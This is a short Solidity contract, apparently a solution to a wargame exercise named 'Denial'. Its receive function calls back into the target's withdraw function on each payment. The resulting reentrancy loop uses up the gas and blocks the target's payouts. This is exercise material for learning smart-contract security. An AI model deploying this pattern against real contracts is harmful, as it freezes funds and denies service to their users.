// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;
    Denial public denial;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
        denial = Denial(_contractAddress);
    }

    //Code me!
    receive() external payable {
        denial.withdraw();
    }
}
